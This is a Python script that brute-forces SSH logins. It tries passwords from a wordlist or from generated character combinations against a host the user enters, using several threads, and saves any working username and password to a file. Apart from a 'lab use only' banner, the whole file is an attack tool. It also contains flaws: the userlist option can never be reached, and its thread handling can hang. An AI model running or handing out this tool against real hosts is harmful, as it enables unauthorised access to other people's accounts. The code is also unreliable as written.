import paramiko
import socket
import time
from colorama import init, Fore
import itertools
import string
import argparse
from threading import Thread
import queue
import sys
import contextlib
import os

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

q = queue.Queue()

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

def is_ssh_open(hostname, username, password, retry_count=3, retry_delay=10):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with suppress_stderr():
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{RED}[-] Invalid credentials for {username}:{password}{RESET}")
        return False
    except paramiko.SSHException as e:
        if retry_count > 0:
            print(f"{BLUE}[*] SSH Exception: {str(e)}{RESET}")
            print(f"{BLUE}[*] Retrying in {retry_delay} seconds...{RESET}")
            time.sleep(retry_delay)
            return is_ssh_open(hostname, username, password, retry_count-1, retry_delay * 2)
        else:
            print(f"{RED}[!] Maximum retries reached. Skipping {username}:{password}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
        return False
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines

def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def worker(host):
    while not q.empty():
        username, password = q.get()
        if is_ssh_open(host, username, password):
            with open("credentials.txt", "w") as f:
                f.write(f"{username}@{host}:{password}")
            q.queue.clear()
            break
        q.task_done()

def main():
    print(f"{BLUE}=== SSH AUTH TEST (LAB USE ONLY) ==={RESET}\n")

    host = input("Target host / IP: ").strip()

    # USER INPUT
    user_mode = input("Use single user or userlist? (u/U): ").strip().lower()
    if user_mode == "u":
        users = [input("Username: ").strip()]
    elif user_mode == "u":
        users = load_lines(input("Path to userlist file: ").strip())
    else:
        print("Invalid user option.")
        sys.exit(1)

    # PASSWORD INPUT
    pass_mode = input("Use password list or generator? (p/g): ").strip().lower()
    if pass_mode == "p":
        passwords = load_lines(input("Path to password list: ").strip())
    elif pass_mode == "g":
        min_len = int(input("Minimum password length: "))
        max_len = int(input("Maximum password length: "))
        chars = input("Characters to use (leave empty for default): ").strip()
        if not chars:
            chars = string.ascii_lowercase + string.digits
        passwords = generate_passwords(min_len, max_len, chars)
    else:
        print("Invalid password option.")
        sys.exit(1)

    threads = int(input("Number of threads (recommended 1–4): "))

    print(f"\n[+] Target: {host}")
    print(f"[+] Users loaded: {len(users)}")
    print(f"[+] Threads: {threads}\n")

    for user in users:
        for password in passwords:
            q.put((user, password))

    for _ in range(threads):
        t = Thread(target=worker, args=(host,))
        t.daemon = True
        t.start()

    q.join()
if __name__ == "__main__":
    main()
